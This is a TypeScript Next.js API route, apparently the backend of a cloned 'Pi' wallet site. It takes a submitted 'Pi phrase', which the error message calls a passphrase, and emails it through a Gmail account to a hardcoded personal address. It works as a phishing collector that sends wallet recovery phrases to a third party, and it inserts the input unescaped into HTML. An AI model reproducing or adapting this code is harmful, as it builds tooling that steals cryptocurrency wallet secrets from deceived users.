import nodemailer from 'nodemailer';

export async function POST(request: Request) {
    try {
        const { message } = await request.json();
        const email = process.env.EMAIL;
        const pass = process.env.PASS;

        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: email,
                pass,
            }
        });

        const mailOptions = {
            from: `Pi Clone ${email}`,
            to: 'sparrowthedev@gmail.com',
            subject: "You just got a new Pi phrase!",
            html: `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${message}</div>`,
        };

        transporter.verify(function (error: any, success: any) {
            if (error) {
                console.log(`here is the error: ${error}`);
            } else {
                console.log("From one: Server is ready to take our messages");
            }
        });

        const result = await transporter.sendMail(mailOptions);

        if (result.response.includes("OK")) {
            return Response.json({ message: "email sent successfully!!" }, { status: 200 });
        } else {
            return Response.json({ error: "Internal server error" }, { status: 500 });
        }
    } catch (error) {
        return Response.json({ error: 'Invalid passphrase' }, { status: 500 });
    }
}
